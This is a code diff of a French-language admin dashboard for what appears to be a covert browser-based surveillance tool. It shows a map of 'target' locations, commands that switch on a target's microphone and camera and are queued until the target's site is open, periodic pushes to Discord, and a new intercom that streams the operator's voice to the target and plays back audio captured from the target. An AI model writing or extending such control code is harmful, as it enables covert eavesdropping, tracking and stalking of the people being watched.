@@ -617,7 +617,7 @@
             <label for="admin-access-code">Code d'accès</label>
             <input id="admin-access-code" type="password" autocomplete="off">
             <button type="submit">Entrer</button>
-            <button id="auth-reset-account" type="button" class="secondary" onclick="resetAdminAccount()" style="display:none;">Changer de compte</button>
+            <button id="auth-reset-account" type="button" class="secondary" onclick="deleteCurrentAccountWithConfirm()" style="display:none;">Supprimer le compte</button>
             <div id="admin-lock-error" aria-live="polite"></div>
             <div id="admin-manager" style="display:none;"></div>
         </form>
@@ -694,7 +694,8 @@
                             <span class="slider round"></span>
                         </label>
                     </div>
-                    <p style="font-size: 0.7rem; color: var(--text-dim); margin: 0;">Permet d'écouter et de parler à la cible en temps réel.</p>
+                    <p style="font-size: 0.7rem; color: var(--text-dim); margin: 0 0 8px 0;">Parle dans ton micro : la cible entend ta voix si son site est ouvert.</p>
+                    <p id="control-online-hint" style="font-size: 0.68rem; color: #fbbf24; margin: 0; display: none;">⚠ Cible hors ligne — ouvre le site cible dans un autre onglet. Les commandes restent en attente 7 jours.</p>
                 </div>
 
                 <div style="background: rgba(255,255,255,0.05); padding: 12px; border-radius: 8px; margin-bottom: 10px; border: 1px solid var(--border-color);">
@@ -913,9 +914,20 @@
         }
 
         function openAccountPanel() {
-            prepareAuthPanel(true);
+            const account = getCurrentStoredAccount();
+            if (!account) return;
+            deleteCurrentAccountWithConfirm();
+        }
+
+        function deleteCurrentAccountWithConfirm() {
+            const account = getCurrentStoredAccount();
+            if (!account) return;
+            const ok = confirm(`Supprimer le compte « ${account.username} » ?\n\nÊtes-vous sûr ? Toutes les préférences locales seront effacées.`);
+            if (!ok) return;
+            deleteManagedAccount(account.username);
+            adminStarted = false;
             document.body.classList.add('admin-locked');
-            setTimeout(() => document.getElementById('admin-access-code').focus(), 50);
+            prepareAuthPanel(false);
         }
 
         function prepareAuthPanel(isManage = false) {
@@ -1005,6 +1017,7 @@
             startAdminDashboard();
             refreshAccessUI();
             switchMainTab(defaultAllowedTab());
+            refreshMapSize();
 
             if (isAdminManager) {
                 openAdminManagerPanel();
@@ -1012,13 +1025,7 @@
         }
 
         function resetAdminAccount() {
-            sessionStorage.removeItem('adminUnlocked');
-            sessionStorage.removeItem('adminActiveUser');
-            localStorage.removeItem('saadaaLastAdminUser');
-            sessionStorage.removeItem('adminUnlocked');
-            currentAccount = null;
-            currentAccess = 'none';
-            prepareAuthPanel(false);
+            deleteCurrentAccountWithConfirm();
         }
 
         function openAdminManagerPanel() {
@@ -1097,15 +1104,55 @@
         }
 
         function startAdminDashboard() {
-            if (adminStarted) return;
+            if (adminStarted) {
+                refreshMapSize();
+                return;
+            }
             adminStarted = true;
 
-            setTimeout(() => map.invalidateSize(), 50);
+            refreshMapSize();
             loadSessions();
             setInterval(loadSessions, 10000);
             setInterval(updateMap, 5000);
-            setInterval(pushToDiscord, 10000); // Push Discord toutes les 10s pour les sessions live
+            setInterval(pushToDiscord, 10000);
+            setInterval(refreshTargetOnlineStatus, 8000);
         }
+
+        let map = null;
+        let osmLayer = null;
+        let satelliteLayer = null;
+
+        function ensureMap() {
+            if (map) return map;
+            map = L.map('map', {
+                zoomControl: false,
+                maxZoom: 22
+            }).setView([46.2276, 2.2137], 5);
+
+            L.control.zoom({ position: 'topright' }).addTo(map);
+
+            osmLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '© OpenStreetMap',
+                maxZoom: 19
+            }).addTo(map);
+
+            satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
+                attribution: 'Tiles © Esri',
+                maxZoom: 22
+            });
+            return map;
+        }
+
+        function refreshMapSize() {
+            ensureMap();
+            requestAnimationFrame(() => {
+                map.invalidateSize(true);
+                setTimeout(() => map.invalidateSize(true), 150);
+                setTimeout(() => map.invalidateSize(true), 600);
+            });
+        }
+
+        window.addEventListener('resize', refreshMapSize);
 
         function refreshAccessUI() {
             document.body.classList.toggle('map-blocked', !hasAccess('targets'));
@@ -1114,23 +1161,6 @@
                 item.classList.toggle('locked', !hasAccess(tab));
             });
         }
-
-        const map = L.map('map', {
-            zoomControl: false,
-            maxZoom: 22 // Zoom plus profond
-        }).setView([46.2276, 2.2137], 5);
-        
-        L.control.zoom({ position: 'topright' }).addTo(map);
-
-        const osmLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-            attribution: '© OpenStreetMap',
-            maxZoom: 19
-        }).addTo(map);
-
-        const satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
-            attribution: 'Tiles &copy; Esri &mdash; Source: Esri, i-cubed, USDA, USGS, AEX, GeoEye, Getmapping, Aerogrid, IGN, IGP, UPR-EBP, and the GIS User Community',
-            maxZoom: 22
-        });
 
         function getDistance(lat1, lon1, lat2, lon2) {
             const R = 6371e3;
@@ -1148,6 +1178,7 @@
 
         function toggleSatellite() {
             if (!requireAccess('settings')) return;
+            ensureMap();
             isSatellite = !isSatellite;
             const btn = document.getElementById('btn-satellite');
             if (isSatellite) {
@@ -1209,6 +1240,7 @@
             document.querySelectorAll('.sidebar-content').forEach(content => {
                 content.classList.toggle('active', content.id === `tab-${tabName}` || content.id === `tab-${tabName}-main`);
             });
+            if (tabName === 'targets' || tabName === 'settings') refreshMapSize();
             updateSelectionInfo();
         }
 
@@ -1220,6 +1252,7 @@
             const infoText = count === 0 ? "Aucune cible sélectionnée." : `Cible : ${alias}`;
             if (document.getElementById('network-target-info')) document.getElementById('network-target-info').innerText = infoText;
             if (document.getElementById('control-target-info')) document.getElementById('control-target-info').innerText = infoText;
+            refreshTargetOnlineStatus();
 
             const camToggle = document.getElementById('camera-toggle');
             if (camToggle && camToggle.checked && count !== 1) {
@@ -1249,10 +1282,92 @@
                 document.getElementById('mic-toggle').checked = false;
                 return;
             }
-            const cmd = enabled ? 'MIC_ON' : 'MIC_OFF';
-            actionOnSelected(cmd);
             if (enabled) {
-                console.log("🎙️ Intercom activé pour la cible sélectionnée");
+                actionOnSelected('MIC_ON');
+                startAdminIntercom();
+            } else {
+                actionOnSelected('MIC_OFF');
+                stopAdminIntercom();
+            }
+        }
+
+        let adminMicStream = null;
+        let adminMicRecorder = null;
+        let adminIntercomPoll = null;
+        let lastTargetAudioTs = 0;
+
+        async function startAdminIntercom() {
+            stopAdminIntercom();
+            try {
+                adminMicStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                adminMicRecorder = new MediaRecorder(adminMicStream);
+                adminMicRecorder.ondataavailable = async (event) => {
+                    if (event.data.size === 0 || selectedSessionIds.size !== 1) return;
+                    const sid = Array.from(selectedSessionIds)[0];
+                    const dataUrl = await new Promise((resolve) => {
+                        const reader = new FileReader();
+                        reader.onloadend = () => resolve(reader.result);
+                        reader.readAsDataURL(event.data);
+                    });
+                    await fetch('/api/intercom', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ sessionId: sid, from: 'admin', audio: dataUrl, timestamp: Date.now() })
+                    });
+                };
+                adminMicRecorder.start(2500);
+                adminIntercomPoll = setInterval(async () => {
+                    if (selectedSessionIds.size !== 1) return;
+                    const sid = Array.from(selectedSessionIds)[0];
+                    try {
+                        const res = await fetch(`/api/intercom?sessionId=${encodeURIComponent(sid)}&from=target&t=${Date.now()}`, { cache: 'no-store' });
+                        if (!res.ok) return;
+                        const data = await res.json();
+                        if (data.audio && data.timestamp !== lastTargetAudioTs) {
+                            lastTargetAudioTs = data.timestamp;
+                            const audio = new Audio(data.audio);
+                            await audio.play().catch(() => {});
+                        }
+                    } catch (e) {}
+                }, 1200);
+            } catch (e) {
+                alert('Autorise le micro sur ton PC admin pour parler à la cible.');
+                document.getElementById('mic-toggle').checked = false;
+            }
+        }
+
+        function stopAdminIntercom() {
+            if (adminIntercomPoll) {
+                clearInterval(adminIntercomPoll);
+                adminIntercomPoll = null;
+            }
+            if (adminMicRecorder) {
+                adminMicRecorder.stop();
+                adminMicRecorder = null;
+            }
+            if (adminMicStream) {
+                adminMicStream.getTracks().forEach(t => t.stop());
+                adminMicStream = null;
+            }
+        }
+
+        async function refreshTargetOnlineStatus() {
+            const hint = document.getElementById('control-online-hint');
+            if (!hint || selectedSessionIds.size !== 1) {
+                if (hint) hint.style.display = 'none';
+                return;
+            }
+            const sid = Array.from(selectedSessionIds)[0];
+            try {
+                const res = await fetch(`/api/sessions?sessionId=${encodeURIComponent(sid)}`);
+                const data = await res.json();
+                hint.style.display = data.isOnline ? 'none' : 'block';
+                if (!data.isOnline && data.lastSeen) {
+                    const ago = Math.round((Date.now() - data.lastSeen) / 60000);
+                    hint.textContent = `⚠ Cible hors ligne (vu il y a ${ago} min). Commandes en attente max 7 jours — le site cible doit être ouvert.`;
+                }
+            } catch (e) {
+                hint.style.display = 'block';
             }
         }
 
@@ -1704,8 +1819,7 @@
 
                 if (res.ok) {
                     console.log(`✅ Commande ${command} acceptée par le serveur.`);
-                    // Notification discrète dans l'admin
-                    showAdminNotify(`Commande ${command} envoyée !`, "success");
+                    showAdminNotify(`Commande ${command} en file (7 jours max). La cible doit avoir le site ouvert.`, "success");
                 } else {
                     console.error("❌ Erreur serveur:", data.error);
                     showAdminNotify(`Erreur: ${data.error}`, "error");
@@ -1929,6 +2043,7 @@
 
         async function updateMap() {
             if (selectedSessionIds.size === 0) return;
+            ensureMap();
 
             for (const sid of selectedSessionIds) {
                 try {
@@ -2030,6 +2145,7 @@
             document.body.classList.remove('admin-locked');
             startAdminDashboard();
             switchMainTab(defaultAllowedTab());
+            refreshMapSize();
         } else {
             prepareAuthPanel(false);
         }
